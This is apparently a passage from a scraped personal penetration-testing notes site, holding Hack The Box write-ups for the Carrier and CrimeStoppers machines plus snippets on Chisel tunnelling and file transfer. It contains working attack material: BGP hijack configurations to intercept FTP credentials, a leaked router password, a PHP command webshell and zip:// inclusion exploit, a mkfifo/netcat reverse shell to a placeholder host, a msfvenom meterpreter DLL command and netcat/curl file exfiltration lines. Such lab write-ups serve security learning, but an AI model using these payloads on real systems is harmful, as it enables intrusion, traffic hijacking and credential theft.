on port 179. Allows you to create loop-free interdomain routing between ASs. The routers use an exterior gateway protocol to route or an interior gateway protocol. To find the shortest or best way to route information. This below is an overview of failures \u0026amp; hopefully one success.\nFailedAggregate-address 10.120.0.0 255.255.0.0 This helps keep routing tables a little bit cleaner. Aggregation combines multiple routes into one single route. I believe in the context of bgp highjacking this might allow all the traffic to go to me.\n\ntry1 neighbor 10.120.15.1 remote-as 300 neigbor 10.100.10.1 remote-as 100 network 10.120.0.0 aggregate-address 10.120.0.0 255.255.0.0 try2 neighbor 10.120.15.1 remote-as 300 neighbor 10.100.10.0 remote-as 200 neighbor 10.120.0.0 remote-as 300 neighbor 10.100.0.0 remote-as 200 network 10.120.15.0 netowrk 10.100.0.0  Failed - Suppressing more-specific routes this fails because ip route 10.120.0.0 255.255.0.0 null0 produces unknown command.\nin this senario you ahve three routers as 100 as 300 as 200 the goal is to change the prifix of as 200 to a less speicfic prefix 160.0.0.0. there are some problems doing this i dont fully understand but the work around is using static routes and redistribute into bgp.\nNeighbors are routers that have asstablished a connection and share route information.\n\nnetwork 10.120.0.0 mask 255.255.0.0 neighbor 10.100.0.0 remote-as 200 redistribute static ip route 10.120.0.0 255.255.0.0 null0 try 2 neighbor 10.100.0.0 remote-as 200 neighbor 10.120.0.0 remote-as 300 network 10.120.15.0 redistribute static try 3 neighbor 10.78.10.2 remote-as 200 neighbor 10.78.11.2 remote-as 300 network 10.120.0.0/16 redistribute static  NEIGHBOR COMMAND\nthe neighbor command establish a tcp connection to update routing tables to other autonomous systems.\nNote: You do not need network 150.10.0.0 or network 160.10.0.0 in RTC unless you want RTC to generate these networks as well as pass on these networks as they come in from AS100 and AS200. Again, the difference is that the network command adds an extra advertisement for these same networks, which indicates that AS300 is also an origin for these routes.\ni believe this is apart of what i need to do, i need to make this route prefered over as 200 to as 300\ni want as 200 to as 100 to as 300\nthis attemped tried to hijack the prefix 10.120.15\nneighbor 10.120.15.1 remote-as 300 neighbor 10.100.0.0 remote-as 200 network 10.120.15.0 mask 255.255.255.0  AS_PATH attribute is the list of as number a route has traversed to its destination for as 100 to talk to as 300 it goes through as 200. when it arrives at 300 it looks like 10.120.0.0(300,200) it inverts the as\u0026rsquo;s to know how to get back. note\nNext hop attribute Ebgp whats used for AS to route in between other ASs. This allows you to spefify the next hop is within that AS. so you can switch over to ibgp and talk to the next router inside there. hmmm interesting. i dont think its applicaable to this ctf as each of the target routers are in different AS.\nBGP Backdoor\neBGP has a distance of 20\ndistance bgp external-distance internal-distance local-distance\ndistance bgp 20\nAS 200 routes directly to AS 300 because thats the shortest path and there for preferred. I want it to go 200 to 100 to 300. distance bgp command to edit the prefered route. this is what i need to get ftp creds. This may not be the way im not sure what kind of internal gateway protocol is being used. Nevermind found itone thing that makes this option finicky is that i dont have access to internal gateway protocol. I can only us router bgp. Based on my understand I should be able to bypass this by using the backdoor command.\nneighbor 10.120.15.1 remote-as 300\nnetwork 10.120.15.1 backdoor\nfail\nSynchronization network 10.100.0.0\nneighbor 10.120.15.10 remote-as 300\nNOTE: This is all about ebgp\nno synchronization\nWeight Attributes Weight attributes os a cisco-defined attribute hmm. This effects how the router will handle priority with routes. Other paths have a default of zero. Weights range from 0 to 65,535 Default is 32768 (sh ip bgp). routes with higher weights have preference. I don\u0026rsquo;t have access to the router to effect theses changes. which is why i think the attemp with editing the weight attribute failed. This is used when you have two equally awesome routes to take and you need to chooses the preferred way. FOR YOUR ROUTER. forted again.\n.https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#howbgpwork\nneighbor 10.120.0.0 remote-as 300\nneighbor 10.100.0.0 remote-as 200\nneighbor 10.120.0.0 weight 200\nneighbor 10.100.0.0 weight 400\nMETRIC Attributes. If there are two routers in the same autonoymous system using the mtric attribute will halp external neighbors know which is the prefered path to take. This is a IGBP not really what im looking for. upong rereading about metrics i found this\n\u0026ldquo;The attribute provides a dynamic way to influence another AS in the way to reach a certain route when there are multiple entry points into that AS. A lower metric value is preferred more.\nUnlike local preference, metric is exchanged between ASs. A metric is carried into an AS but does not leave the AS. When an update enters the AS with a certain metric, that metric is used to make decisions inside the AS. When the same update passes on to a third AS, that metric returns to 0. The diagram in this section shows the set of metric. The metric default value is 0.\u0026rdquo;\nSo using route maps i could changes the preferences of as 200\nROUTE FILTERING Not it either this is used when you want to stop the propogation of route to another autonoymous system. fudge\nhttps://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp\nWell Well Well PEERGROUPS https://www.cisco.com/c/en/us/support/docs/ip/border-gateway-protocol-bgp/26634-bgp-toc.html#asregexp\nAfter reading about peergroups the image form docs makes a little more sense.\nneighbor castcom peer-group\nIt says i can effect external peer groups it says it can effect the update policies of other AS. which would be nice to shut as 300 up. there by making me the prefered path bauhahahahaa.\nCIDR and Aggregate Addresses this sounds promising lol. bgpd4 over bgp3 offers cidr notation so like in the above diagram each of the antonymous systems have aggregated route tables so as 300 broadcast 10.120.0.0/16 and as 200 10.100.0.0/16. i would like to note i saw it appended /21 interesting.\nwhat this does is propogates a supernet route to 10.120.0.0/16\ntry1\nneighbor 10.99.64.2 remote-as 200\nneighbor 10.100.10.1 remote-as 200\nneighbor 10.120.15.1 remote-as 300\nnetwork 10.120.0.0\nnetwork 10.78.0.0\naggregate-address 10.120.0.0 255.255.0.0\ntry 2\nnetwork 10.120.0.0 mask 255.255.0.0\nneighbor 10.100.10.1 remote-as 300\nneighbor 10.100.10.1 remote-as 200\nneighbor 10.120.15.1 remote-as 300\nredistribute static\ntry3\nneighbor 10.120.15.1 remote-as 300\naggregate 10.120.15.0 255.255.255.0 summary-only\naggregate 10.120.15.0 255.255.255.0 as-set\nROUTE MAP I\u0026rsquo;m not sure why nothing i tried worked. This is how im going to get those creds. Using route map and metrics to change the route prefferences of as 200 to as 300. MEtrics can be used to change the path preferences of other autonomous systems.\nnetwork 10.120.0.0\nneighbor 10.120.15.1 remote-as 300\nnetwork 10.120.0.0\nroute-map to-as200 permit 20\nset metric 5\nroute-map to-as300 permit 10\nneighbor 10.120.15.1 remote-as 300\nnetwork 10.120.15.0\nroute-map to-as200 permit 20\nset metric 5\nroute-map to-as300 permit 10\nset metric 2\naccess-list 1 permit 10.120.0.0 0.0.255.255\nneighbor 10.120.15.1 remote-as 300\nnetwork 10.120.0.0\nroute-map to-as300 permit 10\nset metric 2\nroute-map to-as200 permit 20\nset metric 5\naccess-list 1 permit 10.120.0.0 0.0.255.255\nneighbor 10.120.15.2 remote-as 300\nnetwork 10.120.0.0\nroute-map to-as200 permit 10\nset metric 2\nroute-map to-as300 permit 20\nset metric 5\naccess-list 1 permit 10.120.0.0 0.0.255.255\ntry 6\nneighbor 10.120.15.1 remote-as 300 network 10.120.15.0  neighbor 10.100.10.1 remote-as 200  route-map to-as200 permit 20 match as-path 1 set metric 2  route-map to-as300 permit 10 match as-path 1 set weight 20  ip as-path access-list 1 permit ^300$ ip as-path access-list 1 permit ^100$  bgpd.conf router bgp 100 bgp router-id 10.255.255.1 network 10.101.8.0/21 network 10.101.16.0/21 redistribute connected neighbor 10.78.10.2 remote-as 200 neighbor 10.78.11.2 remote-as 300 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 route-map to-as300 out  neighbor 10.78.11.2 remote-as 300 network 10.120.0.0 This part changes neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 10 set metric 2 route-map to-as300 permit 20 set metric 5 access-list 1 permit 10.120.0.0 0.0.255.255  The bgpd.conf file already has an entry for route-map to-as300 permit 10, something to note when you write to the conf file form terminal it will auto arrange the file to the correct format. i had the password at the bottom from the append.\n network 10.120.0.0 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as300 permit 20 set metric 2 access-list 1 permit 10.120.15.0 0.0.0.255 set weight instead of metric weight doesn't work again because it only affects the local router. network 10.120.0.0 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in ip as-path access-list 5 permit ^300$ route-map to-as100 permit 10 set metric 50000 route-map tp-as300 permit 20 set metric 30000 you cannot effect other autonomous systems metrics unless you specify bgp always-compare-med network 10.120.0.0 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as100 permit 10 set metric 50000 route-map tp-as300 permit 20 set metric 30000 ip as-path access-list 5 permit ^300$  to affect other autonomous system metrics bgp always-compare-med. wooolol\nbgp always-compare-med neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 20 set metric 5 route-map to-as300 permit 10 set metric 2 access-list 1 permit 10.120.0.0 0.0.255.255  Next note permit references references different route maps incomming or out going routes. if the first map fail proceed to a higher instance of the route map\nbgp always-compare-med bgp dampening neighbor 10.120.15.1 remote-as 300 network 10.120.0.0 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 20 route-map to-as300 permit 20 set metric 2 access-list 1 permit 10.120.0.0 0.0.255.255  bgp always-compare-med bgp dampening neighbor 10.120.15.1 remote-as 300 network 10.120.0.0 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 20 set metric 5 route-map to-as300 permit 20 set metric 2 access-list 1 permit 10.120.0.0 0.0.255.255  bgp always-compare-med network 10.120.15.0 neighbor 10.78.10.1 route-map to-as200 in neighbor 10.78.11.1 route-map to-as300 in route-map to-as200 permit 20 set metric 5 route-map to-as300 permit 20 match as-path 1 set metric 2 access-list 1 permit 10.120.15.0 0.0.255.255  try adding a match as-path1\nrouter bgp 100 bgp always-compare-med network 10.120.15.0 neighbor 10.120.15.1 remote-as 300 neighbor 10.78.10.1 route-map to-as200 in neighbor 10.78.11.1 route-map to-as300 in route-map to-as200 permit 20 set metric 5 route-map to-as300 permit 20 match as-path 1 set metric 5 ip as-path access-list 1 permit ^300$  perhaps ive been over complicating thing.\nroute-map to-as200 permit 20 set metric 100 route-map to-as300 permit 10 set metric 1 wr router bgp 100 network 10.120.15.10  conf t router bgp 100 bgp always-compare-med route-map to-as200 permit 20 set metric 5 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in wr router bgp 100 network 10.120.15.10  as200 is problably configured with bgp bestpath as-path ignore whichs will force it to go to the sportest path presented to it. If it not on the system it would install 10.120.0.0 from as 300 i believe maybe. I\u0026rsquo;d also like to note that i might have been using the metric atribute wrong. it goes from 200 to 0 0 being default and 1 being preferred over 200.\nSo if i set the metric for to-as300 to 200 it would be the last route, because the default path is 0 which would make as100 lowest would make my path preferred.\nwhile not applicable router compares metrics in the same AS first before other AS that might give those higher path preference.\ni dont think i need to add bpg always-compare-med to my commands because it needs to be configured on to-as200. to accept the changes in the first places\ndefault-metric to set local metrics\nrouter bgp 100 network 10.120.0.0 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 20 route-map to-as300 permit 10 match as-path 1 set metric 200 wr ip as-path access-list 1 permit ^300$  trying to uses the other\nrouter bgp 100 network 10.120.0.0 neighbor 10.78.11.2 route-map to-as100 in neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 20 route-map to-as300 permit 10 match as-path 1 set metric 200 wr ip as-path access-list 1 permit ^300$  trying to aggregate the address\nrouter bgp 100 network 10.78.0.0 aggredate-address 10.120.0.0 255.255.0.0 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 20 route-map to-as300 permit 10 match as-path 1 set metric 200 wr ip as-path access-list 1 permit ^300$  router bgp 100 aggregate-address 10.120.0.0 255.255.0.0 neighbor 10.78.10.2 route-map to-as200 in route-map to-as200 permit 20 route-map to-as300 permit 10 match as-path 1 set metric 200 wr ip as-path access-list 1 permit ^300$  the former seems to cluttered to be the answer.\nrouter bgp 100 aggregate-address 10.120.15.0 255.255.0.0 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 20 route-map to-as300 permit 10 set metric 200 exit wr cp bgpd.conf.orig bgpd.conf  this time use the aggregate attribute-map\nyou need need to add network 10.120.0.0 so that as100 annouces it has the route to as300. arg\naggregate-address 160.0.0.0 255.0.0.0 attribute-map SETORIGIN  conf t clear ip bgp router bgp 100 default-metric 100 network 10.120.0.0 aggregate-address 10.120.15.0 255.255.255.0 suppress-map to-as300 neighbor 10.78.10.1 route-map to-as200 in neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.1 route-map to-as300 in neighbor 10.78.11.2 route-map to-as300 out route-map to-as200 permit 20 match as-path 1 set weight 100 route-map to-as300 permit 10 match as-path 2 set metric 200 exit wr cp bgpd.conf.orig bgpd.conf  clear ip bgp * conf t router bgp 100 network 10.120.15.0 aggregate-address 10.120.15.0 255.255.255.0 neighbor 10.78.10.2 remote-as 200 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 remote-as 200 neighbor 10.78.11.2 route-map to-as300 in neighbor 10.78.11.2 route-map to-as300 out route-map to-as200 permit 20 match as-path 1 route-map to-as300 permit 10 set metric 200 exit ip as-path access-list 1 permit .* ip as-path access-list 2 permit .* wr cp bgpd.conf.orig bgpd.conf  clear ip bgp * conf t router bgp 100 network 10.120.15.0 aggregate-address 10.120.15.0 255.255.255.0 neighbor 10.78.10.2 remote-as 200 neighbor 10.78.11.2 remote-as 300 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 out route-map to-as200 permit 20 match as-path 1 route-map to-as300 permit 20 match as-path 2 set metric 200 exit ip as-path access-list 1 permit .* ip as-path access-list 2 permit .* wr cp bgpd.conf.orig bgpd.conf  id like to take a moment to review what sh ip bgp is outputting\nto get to 300 i go to 200 then 300, i dont want this\nthis is almost what i want to get to 200 i got to 300 then 200\non 10.78.10.2 there are no hopes which is what i believe i want.\nfor me to get too 20 i have to go 300 to 200. I want to keep 10.78.11.2 chan\nim not sure the original bgpd.conf only allows one path to get to as300. when i make my changes i have multiple paths which while i made my changes it could still allow the default path.\n\u0026ldquo;You can use the set as-path prepend command in order to prepend path numbers to your updates and make the path length look longer. But, with attributes such as local preference, metric, or weight, AS400 can have set the exit point to be AS200. In this case, there is nothing that you can do. \u0026ldquo;\nclear ip bgp * conf t router bgp 100 network 10.120.15.0 aggregate-address 10.120.15.0 255.255.255.0 neighbor 10.78.10.2 remote-as 200 neighbor 10.78.11.2 remote-as 300 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 20 match as-path 1 set metric 200 route-map to-as300 permit 10 match as-path 2 set metric 100 exit ip as-path access-list 1 permit .* ip as-path access-list 2 permit .* wr cp bgpd.conf.orig bgpd.conf  change permit attribute to-as200 to 10 it could take up to ten ssecond for a update to occur in this enviroment.\nnetwork 10.120.15.0/24\nclear ip bgp 10.78.10.2 clear ip bgp 10.78.11.2 conf t router bgp 100 network 10.0.0.0 aggregate-address 10.0.0.0 255.255.255.0 neighbor 10.78.10.2 remote-as 200 neighbor 10.78.11.2 remote-as 300 neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 route-map to-as300 out route-map to-as200 permit 20 match as-path 1 set metric 130 exit route-map to-as300 permit 20 match as-path 1 set metric 150 ip as-path access-list 1 permit ^200$ ip as-path access-list 1 deny ^300$ wr end sh ip bgp cp bgpd.conf.orig bgpd.conf  clear ip bgp 10.78.10.2 clear ip bgp 10.78.11.2 conf t router bgp 100 network 10.120.15.0/24 route-map to-as200 permit 20 match as-path 1 set metric 110 exit route-map to-as300 permit 10 match as-path 2 set metric 120 ip as-path access-list 1 deny ^300$ ip as-path access-list 2 deny ^200$ wr end wr sh ip bgp cp bgpd.conf.orig bgpd.conf  clear ip bgp 10.78.10.2 clear ip bgp 10.78.11.2 conf t router bgp 100 no synchronization bgp always-compare-med network 10.120.15.0/24 aggregate-address 10.120.0.0 255.255.0.0 summary-only bgp default local-preference 100 route-map to-as200 permit 10 set metric 50 route-map to-as300 permit 10 set metric 160 wr end wr wr wr sh ip bgp cp bgpd.conf.orig bgpd.conf  Route-map 10, 20 references a set of conditions. When the first set of conditions 10 aren\u0026rsquo;t met it moves to the next highest set of conditions.\nafter you clear ip bgp it still leaves route-map elements.\nin this attempt well through out all preconcived notions.\nclear ip bgp 10.78.10.2 clear ip bgp 10.78.11.2 clear ip bgp * conf t router bgp 100 default-metric 100 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 route-map to-as300 in route-map to-as200 permit 10 match as-path 1 set metric 2 route-map to-as300 permit 10 match as-path 2 set metric 5 ip as-path access-list 1 permit ^200$ ip as-path access-list 2 permit ^300$ end wr sh ip bgp cp bgpd.conf.orig bgpd.conf  sudo iptables -t nat -F sudo iptables -t nat -A PREROUTING -d 10.1.1.2 -m ttl --ttl-gt 1 -j NETMAP --to 10.6.1.2 sudo iptables -t nat -A POSTROUTING -s 10.6.1.2 -j NETMAP --to 10.1.1.2    in this image\n10.78.10.2 connects to 200 on 10.78.11.2 connects via 300 to 200\n10.78.11.2 connects to 300 on 10.78.10.2 connects via 200 to 300\nFAILED this attempt will be slightly different than the others i will clear the route tables first. then completely reconfigure the routers configuration. i will attempt to use the final solution at the end of the cisco case study guide. i reassigned the interfaces, im telling the router . in the exampled i followed they used no synchron which isn\u0026rsquo;t nessisary because that effects ibgp stuff in the same AS. defined the neighbors because i deleted the current configuration. which may have been why my changes didn\u0026rsquo;t work.\nunknown commands it might be becauses its for ospf lol\nclear ip bgp ip subnet-zero interface Loopback0 ip address 10.99.64.2 255.255.255.0 interface eth1 ip address 10.78.10.2 255.255.255.0 interface eth2 ip address 10.78.11.2 255.255.255.0 router bgp 100 network 10.120.0.0 aggregate-address 10.120.15.0 255.255.255.0 suppress-map to-as300 neighbor 10.78.10.2 remote-as 200 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.10.2 route-map to-as200 in neighbor 10.78.11.2 remote-as 300 neighbor 10.78.10.2 route-map to-as300 out neighbor 10.78.11.2 route-map to-as300 in exit ip classless ip default-network 10.120.15.0 ip as-pth access-list 1 permit ^300$ route-map to-as200 permit 20 match as-path 1 set local-preference 300 route-map to-as200 permit 10 match as-path 2 set metric 200 exit wr cp bgpd.conf.orig bgpd.conf  "
},
{
	"uri": "/hackthebox/boxes/carrier-root/",
	"title": "CarrierRoot",
	"tags": [],
	"description": "",
	"content": "This guide will only cover setting up BGP high jacking and to better summarize how to set up a MITM using BGP. There is one method that I believe everyone used which is where you host an FTP server and just redirect the traffic to our ftp server. Not quite as cool as mitm.\nhttps://www.youtube.com/watch?v=2ZxRA8BgmnA\nhttps://0xdf.gitlab.io/2019/03/16/htb-carrier.html#bgp-hijack\nThere\u0026rsquo;s a script running in the background that will reset all the changes made. I had to deal with this the whole time I did the lab. I never once tried to disable it. Next time I have a cron job running the background that\u0026rsquo;s hindering me in someway ill use this.\nreading crontab -l | grep -v \u0026quot;^#\u0026quot; disable chmod -x /opt/restore.sh  I used telnet to connect the router and perform my administrator. It was kind of a pain you had to do some extra steps like fixing the 45007 45005 errors. Adding a password to quagga configuration files. Typing in the credentials was a pain. 0xdf used vtysh free range routing software suite for managing background protocols.\noverview\nshow running-config -\npermit - basically the order in which route-maps are checked in order, once all of the controls of been checked it will break out if none are met.\nprefix-list - I missed this part in my attempts ip prefix-list a set of conditions to check routes against either deny or allow. my understanding of this is that well be targeting 10.120.15.0 network since the network is using /24 /25. If you have two router advertising two different subnets which everyone has the closest match will have priority. an example would be 10.120.0.0/16, the host2 10.120.15.0./24 would be preferred\ncurrent configuration\nshow running-config Building configuration... Current configuration: ! ! interface eth0 ipv6 nd suppress-ra no link-detect ! interface eth1 ipv6 nd suppress-ra no link-detect ! interface eth2 ipv6 nd suppress-ra no link-detect ! interface lo no link-detect ! router bgp 100 bgp router-id 10.255.255.1 network 10.101.8.0/21 network 10.101.16.0/21 network 10.120.15.0/25 redistribute connected neighbor 10.78.10.2 remote-as 200 neighbor 10.78.10.2 route-map to-as200 out neighbor 10.78.11.2 remote-as 300 neighbor 10.78.11.2 route-map to-as300 out ! ip prefix-list chicken seq 5 permit 10.120.15.0/25 ! route-map to-as200 permit 5 match ip address prefix-list chicken set community no-export ! route-map to-as300 deny 5 match ip address prefix-list chicken ! route-map to-as200 permit 10 ! route-map to-as300 permit 10 ! ip forwarding ! line vty ! end  route-map to-as200 effects that autonomous system\nconfigure terminal #### routes to 10.120.15.0. because it is more specific than /24 as300 advertising this route will have priority. #### ip prefix-list chicken permit 10.120.15.0/25 #### route 10.120.15.0 subnet to as100,set community no-export tells as200 not to advertise it's route to as300. this is pretty important. #### route-map to-as200 permit 5 set community no-export match ip address prefix-list chicken #### I think this is disconnects as300 to as200 #### route-map to-as300 deny 5 match ip address prefix-list chicken ou need to do this to advertise the route. router bgp 100 network 10.120.15.0 mask 255.255.255.128  configure terminal ip prefix-list chicken permit 10.120.15.0/25 route-map to-as200 permit 5 match ip address prefix-list chicken set community no-export route-map to-as300 deny 5 match ip address prefix-list chicken  tcpdump\ntcpdump -i eth2 -nnXSs 0 'port 21' -w out.pcap  Passwords BGPtelc0routing\nippsec\nippsec used https://www.draw.io to make to make the network diagram.\ntools to do research on ASN\u0026rsquo;s. these tools are great to use during a pentest to find ip\u0026rsquo;s owned by a the target.\nultratools.com for asn lookup. ipinfo.io\nusing base64 to move files without damaging the integrity of the data is a trick worth remembering.\nbase64 -w 0 chicken.pcap base64 -d chicken.b64.pcap \u0026gt; chickenpwny.pcap  "
},
{
	"uri": "/categories/",
	"title": "Categories",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/windows/chisel/",
	"title": "ChiselTunnel",
	"tags": [],
	"description": "",
	"content": "MY FAVORITE SOCKS PROXY TOOL.\nChisel SERVER\n./Chisel server -p 8000 -reverse -v -reverse the connection this is important -v verbose -p port  Chisel.exe CLIENT\nc.exe client 10.10.15.254:8000 R:8081:127.0.0.1:8081\t "
},
{
	"uri": "/concepts/",
	"title": "Concept",
	"tags": [],
	"description": "",
	"content": "Concept\n DLL_CraFt\u0026amp;BreW So, far i have done a handful of attacks with dlls. making a dll can be tricky especial when it comes to bypassing AV. Microsoft has been getting good at impoving signatures picking up the low hanging fruit. Msfvenom \u0026amp; dll\u0026rsquo;s crafted with visual studio\u0026rsquo;s. cheers to IppSec and 0xdf MSFVENOM remember you don\u0026rsquo;t always need x64 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll \u0026gt; NameMe.dll Beryllium https://github.com/attl4s/pruebas a dll that contains meterpreter shell that takes env var as variables\n  Desync-Attack This writeup will be based on James Kettle work, Click here. This artical is more about me learning how to do this attack.\n  File Transfer ######## LI/NUX ######### Python http server python3 -m http.server 9090 python -m simpleHTTPServer 9090 Curl upload = curl -F 'data=@home/Documents' IP_ADDRESS download = curl http://IP_ADDRESS -o file wget upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename NetCat File Transfer Netcat notice with this method , sender \u0026lt;, reciever \u0026gt;. -w wait, -l listener -p port upload = nc -w 3 [your_ip] 1337 \u0026lt; file.txt listener = nc -lp 1337 \u0026gt; file.\n  WebAppPenTests \n  Windows-Bypass I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can\u0026rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption. CLM uses umci policy to determine what powershell scripts are approved(whitelisted).\n  "
},
{
	"uri": "/hackthebox/boxes/crimestoppers/",
	"title": "CrimeStopper",
	"tags": [],
	"description": "",
	"content": " watch the ippsec video https://www.youtube.com/watch?v=bgKth1K44QA\nread this guide :https://0xdf.gitlab.io/2018/06/03/htb-crimestoppers.html\nThis is just a summary of those two guides.\nInitial scan only shows port 80 open. +\nFSociety ransomware all the major credit databases and destroyed the backups.\nwfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://crimestoppers.htb/?op=FUZZ\nNavigating to list we get a list of submitted tips. A note from white rose.\nhttps://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/\nSo null, byte doesn\u0026rsquo;t work and encoding the string doesn\u0026rsquo;t work.\nYou can retrieve the information using burp, browser or command line. Copy paste into vim and use base64 to decode the file. 0xdf used curl to get the page information removing the useless parts.\nbase64\nCopy the output in burp into a vim :set paste; then use base64 -d list.b64 \u0026gt; list.php\nCURL \u0026mdash;\ncurl -sD - 10.10.10.80/?op=php://filter/convert.base64-encode/resource=index | head -44 | tail -1 | cut -d' ' -f1 | base64 -d \u0026gt; index.php -s silent mode -D dump-header  head\nexamining index.php\nThe Filter\n$op = empty($_GET['op']) ? 'home' : $_GET['op'];  if(!is_string($op) || preg_match('/\\.\\./', $op) || preg_match('/\\0/', $op)) die('Are you really trying ' . htmlentities($op) . '!? Did we Time Travel? This isn\\'t the 90\\'s');  The first part is the GET parameter; we are exploiting GET to get local file inclusion.\n$op = empty($_GET['op']) ? 'home' : $_GET['op'];  (is_string) checks if the VAR is a string or not.\nif(!is_string($op)  (preg_match) Matches a regular expression to a given pattern. Looking for Directory traversal ../ \u0026amp; the NULL byte 0. We\u0026rsquo;re not allowed to escape the local directory.\npreg_match('/\\.\\./', $op) preg_match('/\\0/', $op)  Admin cookie value is 0 (isset) determines if it is a NULL character; it will return true or false. I believe this means if you want to be admin set your cookie to zero.\n//Cookie if(!isset($_COOKIE['admin'])) { setcookie('admin', '0'); $_COOKIE['admin'] = '0'; }  This says if admin cookie is loosely compared to 1. I don\u0026rsquo;t think loose and strict comparison will lead anywhere with this. When the cookie value is changed to 1 a new tab will appear next to upload.\n \u0026lt;?php if ($_COOKIE['admin'] == 1) { echo '\u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;?op=list\u0026quot;\u0026gt;List\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;';  If $op ends with .php it will produce no such page.\nif(!(include $op . '.php')) fatal('no such page');  List.php\nThis goes to the folder named after your ip address and access submitted tips.\n \u0026lt;?php // Only show files uploaded by the client. This is to prevent people from accessing eachothers uploads. foreach (scandir(\u0026quot;uploads/\u0026quot; . $_SERVER['REMOTE_ADDR']) as $file) { if (!preg_match('(\\.)', $file)) { echo \u0026quot;\u0026lt;li\u0026gt;\u0026lt;a href=\\\u0026quot;?op=view\u0026amp;secretname=\u0026quot; . $file . \u0026quot;\\\u0026quot;\u0026gt;\u0026quot; . $file . \u0026quot;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026quot;; } } ?\u0026gt;  curl http://10.10.10.80/uploads/10.10.14.2/\nThis next part is pretty tricky. so we know PHP filter is looking for .. and 0. The script also filters out .php extension so even if we upload a PHP reverse shell, the system won\u0026rsquo;t know what to do with the script. The name of the Directory storing the PHP script is your IP Address. you can\u0026rsquo;t just upload the PHP script because it gets corrupted during copping, adding extra invisible characters. The secretname is randomly generated an md5 sum. We can access it by going to view and we can access it by going to view\u0026amp;secretname.\nMaking the script chickenpwny should be replaced for posterity.\n\u0026lt;? php echo system($_REQUEST['CHANGEME']); ?\u0026gt;  zip cmd.zip cmd.php  base64 -w 0 cmd.zip -w 0 makes it a one liner width 0  UPLOADING THE PHP SCRIPT\n go to the uploads page\n enter some info into the fields\n Turn on Burp Intercept\n click Send Tip\n Send to Repeater\n Then Drop the packet\n Go to Repeater in the tip field copy paste the base64 encode zip file.\n Decode the encoded zip file\n  The highlighted green area is the files name\n/?op=zip://uploads/10.10.14.2/6d069117de936936b6c43c9ca832df8217e704d5%23cmd\u0026amp;chickenpwny=whoami OverView /?op=zip://uploads/YOUR HTB IP ADDRESS/THE SECRET FILE NAME GREEN HIGHLIGHTED AREA ABOVE %23cmd\u0026amp;chickenpwny=whoami %23 is the url encoded representation of #  Pentestmonkey - shells\nFirst setup a NetCat listener nc -lvnp PORT rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc CHANGE_ME PORT\u0026gt;/tmp/f crtl + u to url encode the string, should like the string below %23cmd\u0026amp;chickenpwny=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2\u0026gt;%261|nc+CHANGE_ME+PORT+\u0026gt;/tmp/f  Upgrading the shell, :P tricky python isn\u0026rsquo;t available but python3 is haha ippsec\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;  HOME directory shinagans\ntar -cjvf /var/www/html/uploads/10.10.14.2/firefox.tar.bz2 36jinndk.default/\nmv 36jinndk.default/ ~/.thunderbird/\ncd ~/.thunderbird/\nvim profiles.ini\n36jinndk.default\nthunderbird -ProfileManager\nEMAILS If we created a bug bounty page, would you be open to using them as a middle man? Submit the bug, they will verify the existence and handle the payment.\nI don\u0026rsquo;t know how this ecoins things work.\nOn 12/16/2017 11:46 AM, WhiteRose wrote:\nHello,\nI left note on \u0026ldquo;Leave a tip\u0026rdquo; page but no response. Major vulnerability exists in your site! This gives code execution. Continue to investigate us, we will sell exploit! Perhaps buyer will not be so kind.\nFor more details place 1 million ecoins in your wallet. Payment instructions will be sent once we see you move money.\nDid you know anything about this? Anyways, I\u0026rsquo;m trying to get them to agree to an alternative form of payment where we can better track the recipient.\nHope the DarkArmy thinks we\u0026rsquo;re a bunch of dummies that don\u0026rsquo;t know anything about eCoin.\nElliot.\nWe got a suspicious email from the 